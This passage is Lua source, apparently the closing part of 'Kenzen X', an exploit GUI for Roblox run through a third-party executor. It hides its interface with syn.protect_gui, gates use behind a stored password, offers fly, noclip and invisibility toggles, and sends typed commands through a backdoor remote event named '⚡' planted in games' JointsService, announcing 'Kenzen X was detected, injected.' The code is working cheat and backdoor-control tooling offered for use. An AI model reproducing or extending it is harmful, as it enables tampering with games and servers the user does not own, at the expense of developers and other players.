				passed = true
				TextBox9.PlaceholderText = "Command"; TextBox9.Text = ""
			end
		elseif passed then
			if TextBox9.Text == "cmds" or TextBox9.Text == "commands" then
				tweencommands(false)
			else
				local testc = command(TextBox9.Text)
				if testc ~= nil then
					if game.JointsService:FindFirstChild("⚡") then
						if testc == "script" or testc == "executor" then
						    --print(executor)
							if executor == nil then
								loadexecutor()
							end
							executor.Visible = not executor.Visible
						else
							game.JointsService:WaitForChild("⚡"):FireServer(testc,"😎",false)
						end
					end
				end
				tweencommands(true)
			end

		end
	else
		TextBox9.Text = ""
	end
end)

game:GetService("UserInputService").InputBegan:connect(function(inputObject, gameProcessedEvent)
	if inputObject.KeyCode == Enum.KeyCode.LeftBracket then
		if TextBox9.Position == UDim2.new(-1,0,0.95,0) then
			local tween = TweenService:Create(TextBox9,outtweeninfo, {Position = UDim2.new(0,0,0.95,0)})
			tween:Play()
		else
			local tween = TweenService:Create(TextBox9,intweeninfo, {Position = UDim2.new(-1,0,0.95,0)})
			tween:Play()
		end
	elseif inputObject.KeyCode == Enum.KeyCode.RightBracket then
		for i,v in pairs(ezbuttons) do
			--print("yaya")
			local tween
			if v.Position.Y.Scale > 1.8 then
				tween = TweenService:Create(v,TweenInfo.new(
					0.3,
					Enum.EasingStyle.Quad,
					Enum.EasingDirection.In
					), {Position = UDim2.new(v.Position.X.Scale,0,1,0)})
			elseif v.Position.Y.Scale < 1.8 then
				tween = TweenService:Create(v,TweenInfo.new(
					0.3,
					Enum.EasingStyle.Back,
					Enum.EasingDirection.Out
					), {Position = UDim2.new(v.Position.X.Scale,0,1.9,0)})
			end
			tween:Play()
			wait(0.05)
		end
	elseif inputObject.KeyCode == Enum.KeyCode.BackSlash then
		if TextBox9.Position == UDim2.new(0,0,0.95,0) then
			TextBox9:CaptureFocus()
			TextBox9.Text = ""
		end
	end 
end)

--= Other =--
syn.protect_gui(ScreenGui0); ScreenGui0.Parent = game.CoreGui
for i,v in pairs(commands) do
	local clone = TextLabel14:Clone()
	clone.Parent = ScrollingFrame12
	clone.Text = v
	clone.Visible = true
	clone.ZIndex = 5
end
for i,v in pairs(TextBox9:GetChildren()) do
	if v:IsA("ImageButton") then
		table.insert(ezbuttons,v)
		v.Activated:Connect(function()
			command(v.Name)
			if v.Name == "invisible" then v.Name = "visible"
			elseif v.Name == "fly" then v.Name = "unfly"
			elseif v.Name == "noclip" then v.Name = "clip"
			elseif v.Name == "visible" then v.Name = "invisible"
			elseif v.Name == "unfly" then v.Name = "fly"
			elseif v.Name == "clip" then v.Name = "noclip"
			end
		end)
	end
end

if game.JointsService:FindFirstChild("⚡") then
	game.StarterGui:SetCore("SendNotification", {
		Title = "Kenzen X";
		Text = "Kenzen X was detected, injected.";
		Icon = "rbxassetid://4670964366";
		Duration = "5";
	})
	local cmds = game.JointsService["⚡"]["✨"].Value:split(" ")
	for i,v in pairs(cmds) do
		if v ~= "" then
			local clone = TextLabel14:Clone()
			clone.Visible = true
			clone.Text = v
			clone.Parent = ScrollingFrame12
			clone.TextColor3 = Color3.fromRGB(217, 118, 52)
			clone.ZIndex = 5
		end
	end
end

game.JointsService.ChildAdded:Connect(function(v)
	if v.Name == "⚡" then
		wait(1)
		game.StarterGui:SetCore("SendNotification", {
			Title = "Kenzen X";
			Text = "Kenzen X was detected, injected.";
			Icon = "rbxassetid://4670964366";
			Duration = "5";
		})
		local cmds = game.JointsService["⚡"]["✨"].Value:split(" ")
		for i,v in pairs(cmds) do
			if v ~= "" then
				local clone = TextLabel14:Clone()
				clone.Visible = true
				clone.Text = v
				clone.Parent = ScrollingFrame12
				clone.TextColor3 = Color3.fromRGB(217, 118, 52)
				clone.ZIndex = 5
			end
		end
	end
end)

if writefile then
	if pcall(function() readfile("password.KX") end) then
		if readfile("password.KX") ~= nil then
			if readfile("password.KX") == password then
				passed = true
				TextBox9.PlaceholderText = "Command"; TextBox9.Text = ""
			end
		end
	end
end
